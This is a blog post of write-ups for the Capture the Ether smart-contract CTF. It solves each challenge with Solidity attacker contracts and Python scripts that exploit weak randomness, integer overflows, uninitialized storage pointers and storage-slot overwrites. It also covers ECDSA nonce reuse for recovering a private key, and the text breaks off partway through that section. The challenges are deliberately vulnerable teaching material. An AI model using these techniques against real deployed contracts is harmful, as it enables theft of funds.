# Capture the Ether solutions

<link rel="stylesheet" href="/articles/capture_the_ether_solutions/postStyles.css">

<div class="text-center pb-3 sm:pb-4">
  <span class="font-black"><b>July 24th, 2022</b></span>
</div>

This article is a collection of my solutions to the Capture the Ether challenges. In this article I will basically copy-paste all my solution write-ups from the [github repo](https://github.com/dreth/CaptureTheEther) where my solutions and scripts are.

I solved these in a local brownie (smart contract development framework on python) using a local fork of the ropsten test network. After solving each challenge, I then ran the scripts that would perform the transactions on the test network itself to solve the challenges. Same as with the [Ethernaut challenges](https://dac.sg/blog/ethernaut_solutions).

If you want to reproduce the same environment I used for it, you can do so by following the instructions in the [readme of that same github repo](https://github.com/dreth/CaptureTheEther/blob/main/README.md).

***

## Article index

- [Capture the Ether solutions](#capture-the-ether-solutions)
  - [Article index](#article-index)
  - [Warmup](#warmup)
    - [Call me](#call-me)
      - [Objectives](#objectives)
      - [Solution](#solution)
      - [Submission transaction](#submission-transaction)
    - [Choose a nickname](#choose-a-nickname)
      - [Objectives](#objectives-1)
      - [Solution](#solution-1)
      - [Submission transaction](#submission-transaction-1)
  - [Lotteries](#lotteries)
    - [Guess the number](#guess-the-number)
      - [Objectives](#objectives-2)
      - [Solution](#solution-2)
      - [Submission transaction](#submission-transaction-2)
    - [Guess the secret number](#guess-the-secret-number)
      - [Objectives](#objectives-3)
      - [Solution](#solution-3)
      - [Submission transaction](#submission-transaction-3)
    - [Guess the random number](#guess-the-random-number)
      - [Objectives](#objectives-4)
      - [Solution](#solution-4)
      - [Submission transaction](#submission-transaction-4)
    - [Guess the new number](#guess-the-new-number)
      - [Objectives](#objectives-5)
      - [Solution](#solution-5)
      - [Submission transaction](#submission-transaction-5)
    - [Predict the future](#predict-the-future)
      - [Objectives](#objectives-6)
      - [Solution](#solution-6)
      - [Submission transaction](#submission-transaction-6)
    - [Predict the block hash](#predict-the-block-hash)
      - [Objectives](#objectives-7)
      - [Solution](#solution-7)
      - [Submission transaction](#submission-transaction-7)
  - [Math](#math)
    - [Token sale](#token-sale)
      - [Objectives](#objectives-8)
      - [Solution](#solution-8)
      - [Alternative (better) solution](#alternative-better-solution)
      - [Submission transaction](#submission-transaction-8)
    - [Token whale](#token-whale)
      - [Objectives](#objectives-9)
      - [Solution](#solution-9)
      - [Submission transaction](#submission-transaction-9)
    - [Retirement fund](#retirement-fund)
      - [Objectives](#objectives-10)
      - [Solution](#solution-10)
      - [Submission transaction](#submission-transaction-10)
    - [Mapping](#mapping)
      - [Objectives](#objectives-11)
      - [Solution](#solution-11)
      - [Submission transaction](#submission-transaction-11)
    - [Donation](#donation)
      - [Objectives](#objectives-12)
      - [Solution](#solution-12)
      - [Submission transaction](#submission-transaction-12)
    - [Fifty years](#fifty-years)
      - [Objectives](#objectives-13)
      - [Solution](#solution-13)
      - [Submission transaction](#submission-transaction-13)
  - [Accounts](#accounts)
    - [Fuzzy identity](#fuzzy-identity)
      - [Objectives](#objectives-14)
      - [Solution](#solution-14)
      - [My bruteforce result](#my-bruteforce-result)
      - [Submission transaction](#submission-transaction-14)
    - [Public key](#public-key)
      - [Objectives](#objectives-15)
      - [Solution](#solution-15)
      - [Submission transaction](#submission-transaction-15)
    - [Account takeover](#account-takeover)
      - [Objectives](#objectives-16)
      - [Solution](#solution-16)
      - [Parameters required](#parameters-required)
        - [`r`](#r)
        - [`s`](#s)
        - [`z`](#z)
      - [Obtaining the private key](#obtaining-the-private-key)
      - [Python implementation](#python-implementation)
      - [Submission transaction](#submission-transaction-16)
  - [Miscellaneous](#miscellaneous)
    - [Assume ownership](#assume-ownership)
      - [Objectives](#objectives-17)
      - [Solution](#solution-17)
      - [Submission transaction](#submission-transaction-17)
    - [Token bank](#token-bank)
      - [Objectives](#objectives-18)
      - [Solution](#solution-18)
      - [Submission transaction](#submission-transaction-18)

***

## Warmup

### Call me

#### Objectives

> To complete this challenge, all you need to do is call a function.

#### Solution

Call the `callme()` function to turn `isComplete` into `true`.

#### Submission transaction

https://ropsten.etherscan.io/tx/0xc65c52bbf6f4b79832a12a24cd3fb654dc021b74c055f46530b3dde55b0a3866

***

### Choose a nickname

#### Objectives

> To complete this challenge, set your nickname to a non-empty string.

#### Solution

All we have to do is call `setNickname()` on the CaptureTheEther contract with the nickname as hex. In brownie I did this by encoding the string and passing in the hex value:

```python
cte.setNickname("zooberto".encode('utf8').hex(), _from)
```

#### Submission transaction

https://ropsten.etherscan.io/tx/0x5033e566d085e7a00206039798fbaa7e88e8eba1212853351a28358672d4fb48

***

## Lotteries

### Guess the number

#### Objectives

> I’m thinking of a number. All you have to do is guess it.

#### Solution

The solution is in the state variable `answer`, which is 42. All we have to do is call `guess()` passing 42 and with a value of 1 ether. This will return the entire balance of the contract, which is 1 ether on deployment as per the constructor + 1 ether that we send to be able to call `guess()`.

#### Submission transaction

https://ropsten.etherscan.io/tx/0x9d8685713a4bbbdc744b5ce040c8c2107e9e5be7e0a672d1621943f08b8460b0

***

### Guess the secret number

#### Objectives

> This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!

#### Solution

It's not easy to reverse a hash, but it's easy to try out the entire possible set of answers ($2^8 - 1$), as the answer `n` is a uint8. We can easily bruteforce this by just hashing all $x$ with $0 \leq x \leq 2^8 - 1$ and comparing the resulting hash with `answerHash`. 

The correct `n` turns out to be 170.

#### Submission transaction

https://ropsten.etherscan.io/tx/0x338819d91537aa6dc17be67cf32dbc1e14fd7ef341a3d50239bc9b9de129be31

***

### Guess the random number

#### Objectives

> This time the number is generated based on a couple fairly random sources.

#### Solution

We can deduct the number from the keccak256 hash of the block hash and the time in which the contract is deployed. 

Alternatively, we can just pull the number from the state variable `answer` in the storage slot `0x`.

I did the latter as follows:

```python
answer = int(web3.eth.get_storage_at(guess_the_random_number.address, '0x').hex(), 16)
```

#### Submission transaction

https://ropsten.etherscan.io/tx/0xdd49b0fffad32c5de917f4a6436ca975e7c33358fa009407c86ef7954f9a0d98

***

### Guess the new number

#### Objectives

> The number is now generated on-demand when a guess is made.

#### Solution

We just need to code a contract that generates the number the exact same way prior to guessing it. ~~For some reason that I don't quite understand though, the `guess()` call simply would not go through until I tried to do it through the constructor of the contract.~~ I simply didn't have a fallback function to receive the funds, so it worked in the constructor of the contract because before finalizing constructor execution, the funds would have already been sent to my address, but if a fallback function is added, then the funds can be properly received by the contract and the transactions won't fail.

I coded the contract as follows:

```js
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

contract GuessTheNewNumberAttack {
    constructor(address payable challenge) public payable {
        // low-level call success
        bool success;

        // check that we're forwarding the correct amount of funds
        require(msg.value == 1 ether, 'msg.value should be at least 1 ether');

        // get answer
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        // make the guess
        (success,) = challenge.call{value:1 ether}(abi.encodeWithSignature("guess(uint8)", answer));
        require(success, "guess failed");

        // send funds back to my account
        (success,) = msg.sender.call{value:address(this).balance}("");
        require(success, 'call failed');
    }
}
```

On deployment, the guess was successful (as it runs in the constructor) and the balance is sent back to my wallet. By simply deploying this contract, the challenge is solved.

This can be solved similarly in the same version of the solidity compiler that the challenge is originally using (0.4.21), but given that I'm using a newer version, there's some small nuances due to changes in the solidity compiler since then:

- `block.blockhash()` has been replaced by `blockhash()`
- `now` has been deprecated in favor of `block.timestamp`
- Now it's not possible to pass multiple parameters to the `keccak256()` hash function, so we must use `abi.encodePacked()` before passing it to `keccak256()`
- It is not possible to cast directly from a hash to uint8, so we must first pass through a type that has the same size in bytes as the value returned by the hash function, so we first cast to uint256 and then to uint8.

#### Submission transaction

https://ropsten.etherscan.io/tx/0x9127996a2073acf24ecbfbd3b7f2eeba379c91815658b98e641c7035060a1eba

***

### Predict the future

#### Objectives

> This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

> Note that it is indeed possible to solve this challenge without losing any ether.

#### Solution

We have to follow a few steps here:

1. Code and deploy a contract with at least 3 functions:
    + One that locks in the guess (calling `lockInGuess()`)
    + One that calls `settle()` but *only* if it *knows* the guess will work
    + One fallback function to receive ETH

2. The function that calls `settle()` is specially important, it has to generate the answer just like the PredictTheFutureChallenge contract, but it should only attempt to do this settle if the answer is equal to the guess made when we call `lockInGuess()`. I defined it as follows:

```js
function callSettle() public {
    // prevent the tx from continuing if the answer is not going to pass as correct
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
    require(answer == 0, "tx will fail and guesser will be overwritten");

    // make the guess and check if the challenge is complete, otherwise revert
    challenge.settle();
    require(challenge.isComplete(), "challenge not complete yet");
    

    // send funds to my address
    (bool success,) = msg.sender.call{value:address(this).balance}("");
    require(success, "call failed");
}
```

3. Iteratively call this `callSettle()` function until the guess goes through. I did it as follows:

```python
# call settle until it works, because `guess` is already 0
while True:
    # check if the challenge is completed
    result = predict_the_future.isComplete()
    print(f'The challenge is complete: {result}')
    if result:
        break
    
    # call settle
    try:
        attacker.callSettle(_from | {'allow_revert':True})
    except:
        pass

    # check if the guesser has been overwritten
    guesser = web3.eth.get_storage_at(predict_the_future.address, '0x').hex()
    print(f'The guesser is: {guesser}')
    if attacker.address[-40:].upper() != guesser[-40:].upper():
        print('guesser has been overwritten')
        break
```

Here I call the function until either the challenge is complete, or if the guesser changes to the null address. I had this last check because if I were to generate a different guess than what I coded in the attacker contract and the `settle()` function was successfully called, then we would have to call `lockInGuess()` again to make `guesser = msg.sender` and not the null address. This scenario, however, is probably not possible.

Eventually, after a few tries, the attempt will go through if it passes. This can still be done if the set of possible answers is larger than just 10, but it would probably take much longer (unless we get lucky).

#### Submission transaction

https://ropsten.etherscan.io/tx/0xb065fda4383b65408dd6f021f12071a44b4d44d24106fd5be006287f2fee4d05

***

### Predict the block hash

#### Objectives

> Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.

#### Solution

In both the Solidity compiler version 0.4.21 (for `block.blockhash()`) and ^0.8.0 (for `blockhash()`), the function to obtain the block hash from a block number only returns the hash for the 256 most recent blocks. 

As a result, to pass the challenge we must:

1. Call `lockInGuess()` with the `hash` value `0x0000000000000000000000000000000000000000000000000000000000000000`
2. Wait for this previous transaction to have about 256 block confirmations 
3. Call the `settle()` function, which should now _always_ return `0x0000000000000000000000000000000000000000000000000000000000000000` for `answer`, given that `settlementBlockNumber` will be 256+ blocks in the past.

#### Submission transaction

***

## Math

### Token sale

#### Objectives

> This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.
> The contract starts off with a balance of 1 ether. See if you can take some of that away.

#### Solution

While _incredibly_ simple, this problem took me _days_ to solve, as I was not aware (or forgot) of a few things:

* Floating point numbers do not exist in Solidity (as of writing this).
* Operations in Solidity between whole numbers which would yield a floating point number are immediate rounded down at _every step_, so an arithmetic equation consisting of multiple operations would be applied a floor function at every step of the operation, e.g. $2 \div 3 * 7 \div 2 \rightarrow \lfloor\lfloor\lfloor 2 \div 23 \rfloor * 7 \rfloor \div 2 \rfloor$.
* It is extremely difficult to get a perfect 0 after an integer overflow using products, therefore, in order to solve this problem, it's nearly impossible that the price for which I'll be able to buy the tokens (each worth 1 ether) will be _exactly_ zero wei.
* I completely forgot that python will do things in the background with math, like for example: `1e18` is immediately considered a float, even though it's a whole number, therefore, to have `1e18` as an integer, I should be writing `int(1e18)`. 

To solve it:


All that's needed to be passed to `numTokens` is a value that when multiplied by $10^{18}$ will yield a number that we can:

1. Pay for in wei that is lower than  $10^{18}$ itself
2. As low as possible (ideally) as long as condition 1 holds

For this you can create a simple function that will be the base to the overflow exploit, for example:

$$f(x) = \lfloor (\frac{2^{256} * x}{10^{18}} + 1) * 10^{18}\rfloor\mod 2^{256}$$

Then optimize for $min(f(x))$ while $x > 0$. I did this by bruteforce and made a simple neat table with the best numbers I got:

|             f(x) |                           x | 
|-----------------:|----------------------------:|
|     265665118208 |                      549972 |
|     531330236416 |                     1099944 |
|     730579075072 |                     1512423 |
|     996244193280 |                     2062395 |
|    1261909311488 |                     2612367 |

I used this simple script to do it and then neatly pack it on one dataframe:

```python
from math import floor
import numpy as np
import pandas as pd

# make list to optimize
best_vals = {'ideal_overflow':[], 'ideal_overflow_multiplier':[], 'loop_range':[]}

# minimizing for the remainder gas to send
overflow_computation = lambda x: (floor(int(int(2**256)*x) // int(1e18)) + 1) * int(1e18) % int(int(2**256))
np_overflow_computation = np.vectorize(overflow_computation)

# loop a bunch of times
for i in range(1, 200):
    range_to_test = np.arange(i*int(5e5), (i+1)*int(5e5), 1)
    tested_range = np_overflow_computation(range_to_test)
    ideal_overflow = np.min(tested_range)
    ideal_overflow_multiplier = np.where(tested_range == ideal_overflow)

    # construct csv
    best_vals['ideal_overflow'].append(ideal_overflow)
    best_vals['ideal_overflow_multiplier'].append(range_to_test[ideal_overflow_multiplier][0])
    best_vals['loop_range'].append((np.min(range_to_test), np.max(range_to_test)))
    
best_vals = pd.DataFrame(best_vals)
best_vals.to_csv('best_vals.csv')
print(best_vals.sort_values(by='ideal_overflow'))

```

In this case, I'd simply choose the lowest one for `f(x)` and make the function calls:

1. Call `buy()` passing in $(\frac{2^{256} * 549972}{10^{18}} + 1)$ as `numTokens`.

2. Call `sell()` passing in $1$ as `numTokens`.

3. Check if the challenge is complete by calling `isComplete()` or just clicking on _Check Solution_ on the Capture The Ether site.

#### Alternative (better) solution

I asked a question on the Ethereum StackExchange regarding some of my lack of understanding of solidity mathematical operations and Usmann was kind enough to write a better solution than mine which allows you to solve this while being able to send 0 wei to the contract. His solution was layed out in his answer to my question [here](https://ethereum.stackexchange.com/a/131705/104415).

#### Submission transaction

https://ropsten.etherscan.io/tx/0x8b95f854e11e1b9a50f38f689d44bc018f65abc19753af497838b1ad5987b6ca

***

### Token whale

#### Objectives

> This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.
> Find a way to accumulate at least 1,000,000 tokens to solve this challenge.

#### Solution

The `transferFrom()` function in this contract is using the same `_transfer()` internal function as `transfer()`, however, `transferFrom()` should be deducting tokens from the address whose tokens are being moved out, so the address we pass as `from` in `transferFrom()`, however, it instead deducts it from `msg.sender`.

Because of this bug and the fact that the contract is using Solidity 0.4.21, this opens the contract up for an integer overflow bug. All we have to do to exploit it is to:

1. Call `approve()` from address 1 to approve address 2 to move tokens out of address 1

2. Call `transferFrom()` from address 2 and make sure that the receiving address is either address 1 or another address that is not address 2

3. Call `transfer()` from address 2 to send at least 1M tokens to address 1

4. Call `isComplete()` to check


#### Submission transaction

https://ropsten.etherscan.io/tx/0x038d72cb3b179c25582068f2d8a2ac3d701eabcf997ce918a424525ccf21bef5

***

### Retirement fund

#### Objectives

> This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.
> I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).
> I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

#### Solution

The function `collectPenalty()` allows us to withdraw the entire balance of the contract if:

1. `startBalance` is more than the total contract balance
2. If there's an overflow where the balance of the contract is larger than `startBalance`

In this case, we simply cannot call `withdraw()` or somehow move funds away from the contract in any other way aside from option number 2. Therefore, because the contract has no payable function, we have to somehow force funds into the contract. 

An easy way to do this is to deploy another contract, fund it with at least 1 wei and then destroy it calling `selfdestruct()` in any of the contract functions and directing the contract funds into the retirement fund contract. This will allow us to cause an overflow that causes `withdrawn` to be larger than 0 and therefore drains the contract.

The buggy line in question:

```js
uint256 withdrawn = startBalance - address(this).balance;
```

Nothing critical that allows drainage of funds should rely on the value of the contract balance. At least not on the upside, since anyone can simply force funds into the contract.

#### Submission transaction

https://ropsten.etherscan.io/tx/0x2e1da049d1bc5a70bccc081c4734c9ebd3f8ada241252ffdbd261fc230918f86

***

### Mapping

#### Objectives

> Who needs mappings? I’ve created a contract that can store key/value pairs using just an array.

#### Solution

Through the `set()` function, it's possible to overflow the length of the array by passing in the maximum allowable uint256 minus 2 (as `key`).

```js
function set(uint256 key, uint256 value) public {
    // Expand dynamic array as needed
    if (map.length <= key) {
        map.length = key + 1;
    }

    map[key] = value;
}
```

After passing this value as `key`, the length of the array will be the maximum allowable uint256, which allows us to manipulate every single element in this contract's storage, including `isComplete`.

Given that `isComplete` is in the first contract storage slot, we can find the hash of this item as if it was part of the `map[]` array. That position will simply be the keccak256 hash of a uint256 that is `1`, in this case:

$$0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$$

We then subtract the value of this hash from the size of slots in memory that a contract can have, which is the maximum uint256 + 1, so $2^{256}$, therefore:

$$2^{256} - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)$$

The hex value of this number is:

$$0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a$$

With this value we can now call `set()` with `key = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a` and with `value = 1`. Which overwrites the `0x0000000000000000000000000000000000000000000000000000000000000000` that is held in this memory slot representing the value of `isComplete` with `0x0000000000000000000000000000000000000000000000000000000000000001` which as a `bool` represents the value `true`.

Therefore, when we call the getter `isComplete()` for this state variable (since it's a public variable), we get `true` and the challenge is complete. 

#### Submission transaction

https://ropsten.etherscan.io/tx/0x9e77f98e6cf3eba43ed8d4ce2f176d9c25e7f0116d2a7b2e0a51fbfb058eba52

***

### Donation

#### Objectives

>A candidate you don’t like is accepting campaign contributions via the smart contract below.
>To complete this challenge, steal the candidate’s ether.

#### Solution

The function `donate()` contains a bug:

```js
function donate(uint256 etherAmount) public payable {
    // amount is in ether, but msg.value is in wei
    uint256 scale = 10**18 * 1 ether;
    require(msg.value == etherAmount / scale);

    Donation donation;
    donation.timestamp = now;
    donation.etherAmount = etherAmount;

    donations.push(donation);
}
```

The variable `donation` is not initialized, so it is defaulted to storage. As a result, `donation` now is a pointer that affects storage slot 0 (`donations`) and storage slot 1 (`owner`). As a result, whatever value is assigned to these two variables, but in particular, to `etherAmount`, will write to those two storage slots.

```js
donation.timestamp = now;
donation.etherAmount = etherAmount;
```

To complete the challenge, all you have to do is pass the uint conversion of your address divided by `scale` as `etherAmount`, after this, you can call `withdraw()` and drain the contract. 

In Python I did it as follows:

```python
donation.donate(acc.address, _from | {'value':floor(int(acc.address,16)//1e36)})
```

Where:

* `_from` is {'from':acc.address}
* `acc` is my loaded account through my private key (the account doing the capture the ether challenges)
* `floor()` is the floor function
* `//` is integer division
* `int(acc.address, 16)` is the conversion to int of my address (basically hexadecimal $\rightarrow$ decimal)


#### Submission transaction

https://ropsten.etherscan.io/tx/0x5fc76f733f3384fa064f8d10acda683ca35cd683dc47781aa2e9d5ef9913f5b8

***

### Fifty years

#### Objectives

>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.
>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.

#### Solution

Theres some exploitable mistakes in `upsert()`. We can solve this challenge as follows:

1. Call `upsert()` with:
   + `index` as a value larger than 0 (length of `queue`), in my case I used 1, this would send us to the else block of that if statement.
   + `timestamp` as the largest uint256 minus the seconds in a day (86400). We know block timestamps are set in unix time, which is measured in seconds, and that the require statement in the else block checks that the timestamp we input is larger than the timestamp of the previous element to the one we add + one day (86400 seconds).
   + Sending exactly 1 wei, which makes `queue.length = 1`, we need this to be able to add an additional element to `queue`. 

Calling `upsert()` with these parameters will cause the code in the `else` block to run, which never initializes `contribution`. Therefore, we would be overwriting:
* The contents of `queue`'s length, because the length of a dynamically-sized array is the first property of it that's stored in a contract's storage.
* The contents of `head` with the value of this block timestamp. This is not particularly relevant because we will then overwrite the contents of `head` again, but it's important to mention that it will also do this.

2. Call `upsert()` again with:
    + `index` as 1, which would still go to the else block
    + `timestamp` as 0. in this case we want to overwrite the value of `head` with 0, since we made it $2^{256} - 86400$ before and this would not allow us to call `withdraw()`, because the current `block.timestamp` would be much smaller than $2^{256} - 86400$
    + Sending exactly 1 wei, as we want to retain the length of `queue`.

In this case, we now have `head` as 0, which allows us to call `withdraw()` and also include the first contract deposit in the withdrawal amount, which is the first element of the `queue` array.

3. Call `withdraw()` with `index = 1`. We now can call `withdraw()` because the timestamp in the second struct of the array is 0, which is always lower than `block.timestamp` and because `head` is still 0, it'll allow us to withdraw the full contract balance.

#### Submission transaction

https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf

***

## Accounts

### Fuzzy identity

#### Objectives

>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:
>
>1. I always use a wallet contract that returns “smarx” if you ask its name.
>2. Everything I write has bad code in it, so my address always includes the hex string badc0de.
>
>To complete this challenge, steal my identity!

#### Solution

There's two conditions we need to satisfy to successfully pass the two require statements in `authenticate()`:

1. When we call the `authenticate()` function from a contract, there must be a `name()` function defined in the calling contract that returns "smarx", I defined it as follows:

```js
function name() public view returns (bytes32) {
    return bytes32("smarx");
}
```

2. We need that our contract address has the particular property that when it is operated with the `mask` as defined in `isBadCode` using a bitwise and (`&`) that its returning value is the value of `id`, which is any hex with `badc0de` in it, in any position. 

This last particular quality is especially difficult to attain (at least compared to the first one). The reason for this is that we need to bruteforce the address of this to-be-deployed contract that we will use to interact with the FuzzyIdentityChallenge contract.

Given that contract addresses are deterministic and computed using the deployer's address and the nonce in which the contract wil be deployed, we can generate lots of different contract addresses in three ways in order to bruteforce it:

1. Utilizing one address and increasing the nonce by one until we find it

2. Utilizing many addresses and the nonce 0, meaning that the first transaction each address makes will be the attacker contract deployment

3. Mixing 1 and 2 by creating many addresses and testing each address up to a specific nonce

No matter the approach, we then have to bruteforce one address+nonce combination for which the condition in `isBadCode()` is met.

This takes a _long_ time. There probability that the string `badc0de` appears written exactly like that is of $\frac{1}{16^{7}} \approx 0.000000004$, which is slightly alleviated by the fact that we can have it in 34 different positions, which increases the probability significantly ($\frac{1}{16^{7}} * 34 \approx 0.000000136$, but this still requires millions of tries.

It certainly does not particularly help that I chose python to do this, as python is notoriously slow, this would've been much faster to run in a compiled, low-level programming language, albeit much more time consuming to code.

Once the account+nonce is found, all we have to do is run `authenticate()` from a contract deployed by this account at the nonce we found.

#### My bruteforce result

The mnemonic I was able to find with my bruteforce is:

```
faint casino always journey city view glue drum elephant weather during maple
```

Which generates the address `0xB4Fb8ba4EEf20F2F64E0082a302FE3291C33F0ac` at offset 765.

This address will deploy (now has already deployed) at nonce 0 the contract `0xe8e503a2294ac68e0f9f52e2badc0de90c6e2142` which contains the `badc0de` string.

#### Submission transaction

https://ropsten.etherscan.io/tx/0x01bbd72aa9f8332658164820b190430404eb1dc956dd53fb26b21d3a9b2fafdf

***

### Public key

#### Objectives

>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.
>To complete this challenge, find the public key for the owner's account.

#### Solution

The public key associated with an address can be derived from a transaction signature. In this case, the account's public key we need can indeed be derives as the account has made at least _one_ transaction.

The transaction in question has the following hash: [`0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb`](https://ropsten.etherscan.io/tx/0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb).

This transaction is the _only_ transaction that this account has signed, but because it was signed by this address and it's an _outgoing_ transaction, we can derive the public key from this specific transaction's `v`, `r` and `s`.

This is detailed in [Appendix F of the ethereum yellowpaper](https://ethereum.github.io/yellowpaper/paper.pdf#subsection.4.2), where the methodology of generating transaction signatures is defined.

Putting these three values together we can reconstruct the signature and recover the public key from the message hash. Which turns out to be:

```
0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4
```

#### Submission transaction

https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf

***

### Account takeover

#### Objectives

> To complete this challenge, send a transaction from the owner's account.

#### Solution

An Ethereum transaction is composed of several different things. In particular, transactions prior to EIP-1559, have the following parameters:

```json
{
    "nonce": 0,
    "gasPrice": 1000000000,
    "gasLimit": 21000,
    "to": "0x92b28647Ae1F3264661f72fb2eB9625A89D88A31",
    "value": 1230000000000000000,
    "data": "0x",
    "v": 41,
    "r": "0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166",
    "s": "0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8"
}
```

The Keccak256 hash of the RLP encoding of the concatenation of these values is this transaction's hash (its unique identifier).

In particular, the parameters `v`, `r` and `s` are used to sign Ethereum transactions using the private key of the sender of this transaction. Ethereum transaction signatures use a specification of ECDSA defined in [Appendix F of the Ethereum yellowpaper](https://ethereum.github.io/yellowpaper/paper.pdf#appendix.F).

According to ECDSA, the value of `k` (**I will refer to it as `r`** given that this is the letter used to refer to `k` in Ethereum) has to be a cryptografically secure random integer. This integer has to _necessarily_ be chosen in a cryptografically secure random way, it should *never* be the same for two transactions and it should also never be predictable (if tx A uses `r`, tx B should _not_ use something like `r+1`).

In this challenge, the address in question (`0x6B477781b0e68031109f21887e6B5afEAaEB002b`), specified in the `owner` state variable of the challenge contract, has used `r` in two distinct transactions. As a result of this repeated use of `r`, we can actually derive the private key of this address (more on why this is possible in [this excellent wikipedia article](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#Signature_generation_algorithm)) solving a simple system of equations.

To solve the system of equations, we need to first gather some information from these transactions. This _should_ be trivial, but Ethereum has changed quite significantly since the creation of this challenge, so obtaining some of the information required to solve the system of equations is certainly, in my opinion, not the easiest task in the universe, but it's possible.

#### Parameters required

##### `r`

* `r`: We need to get the repeated `r` value used for both transactions. This is relatively easy, all you need to do is pull _all_ the transactions the address has made and look for the ones that have the same `r`. I did this by pulling all the data for this address from the Etherscan API:

```python
txs = requests.get(f'https://api-ropsten.etherscan.io/api?module=account&action=txlist&address=0x6b477781b0e68031109f21887e6b5afeaaeb002b&startblock=0&endblock=99999999&page=1&offset=269&sort=asc&apikey={os.environ["ETHERSCAN_API_KEY"]}').json()
```

After this, I gathered all the hashes for all the transactions and loaded them into python using web3.py:

```python
txs = [web3.eth.get_transaction(tx['hash']) for tx in txs['result']]
```

I then used `Counter` from the awesome `collections` library to count all the `r` values and see which is the repeated one:

```python
repeated_r = list({v:k for k,v in Counter([tx['r'].hex() for tx in txs]).items() if v > 1}.values())[0]
```

And then identified which were the transactions that had this `r` value, and they turn out to be the first and second transactions the address has made:

```python
txs_with_repeated_r = [tx for tx in txs if tx['r'].hex() == repeated_r]
```

Now that we have identified the transactions and acquired the `r`, we can now continue gathering what we need to derive the private key. For later, let's call this value $r$.

##### `s`

* `s`: This is trivial, we have the transaction objects and all we need to get is the `s` for _both_ transactions, we can call these $s_1$ (for the first tx) and $s_2$ (for the second tx). To get them in python, I did this:

```python
s1,s2 = (tx['s'].hex() for tx in txs_with_repeated_r)
```

##### `z`

* `z`: There's going to be two values of `z`, one per transaction, let's call them $z_1$ and $z_2$.

$z$ is the message hash. For this you take all the transaction's parameters that are used to create the transaction hash and change a few important fields.

In this case, the message hash will be a simulated transaction with the ordinary parameters that goes into its hash, but with `v` changed for its chain id (3 for ropsten), `r` empty and `s` empty.

1. For transaction 1 (nonce 0), with the corresponding changes:

```json
{
    "nonce": 0,
    "gasPrice": 1000000000,
    "gasLimit": 21000,
    "to": "0x92b28647Ae1F3264661f72fb2eB9625A89D88A31",
    "value": 1230000000000000000,
    "data": "", 
    // changes here 
    "v": 3, 
    "r": "", 
    "s": ""
}
```

2. For transaction 2 (nonce 1) with the corresponding changes:


```json
{
    "nonce": 1,
    "gasPrice": 1000000000,
    "gasLimit": 21000,
    "to": "0x92b28647Ae1F3264661f72fb2eB9625A89D88A31",
    "value": 1811266580600000000,
    "data": "",
    // changes here
    "v": 3,
    "r": "",
    "s": ""
}
```

Also important to note is that obviously, prior to encoding, the values should all be in bytes and should all be concatenated. As a result, your transactions' parameters should look like this:

1. For transaction 1

  + In hex:

```json
{
    "nonce": "",
    "gasPrice": "0x3b9aca00",
    "gasLimit": "0x5208",
    "to": "0x92b28647ae1f3264661f72fb2eb9625a89d88a31",
    "value": "0x1111d67bb1bb0000",
    "data": "",
    "v": "0x03",
    "r": "",
    "s": ""
}
```

  + In python as bytes:

```python
{
    'nonce': b'', 
    'gasPrice': HexBytes('0x3b9aca00'), 
    'gasLimit': HexBytes('0x5208'), 
    'to': HexBytes('0x92b28647ae1f3264661f72fb2eb9625a89d88a31'), 
    'value': HexBytes('0x1111d67bb1bb0000'), 
    'data': b'', 
    'v': HexBytes('0x03'), 
    'r': b'', 
    's': b''
}
```

1. For transaction 2

  + in hex:

```json
{
    "nonce": "0x01",
    "gasPrice": "0x3b9aca00",
    "gasLimit": "0x5208",
    "to": "0x92b28647ae1f3264661f72fb2eb9625a89d88a31",
    "value": "0x1922e95bca330e00",
    "data": "",
    "v": "0x03",
    "r": "",
    "s": ""
}
```

  + in python as bytes:

```python
{
    'nonce': b'\x01', 
    'gasPrice': HexBytes('0x3b9aca00'), 
    'gasLimit': HexBytes('0x5208'), 
    'to': HexBytes('0x92b28647ae1f3264661f72fb2eb9625a89d88a31'), 
    'value': HexBytes('0x1922e95bca330e00'), 
    'data': b'', 
    'v': HexBytes('0x03'), 
    'r': b'', 
    's': b''
}
```

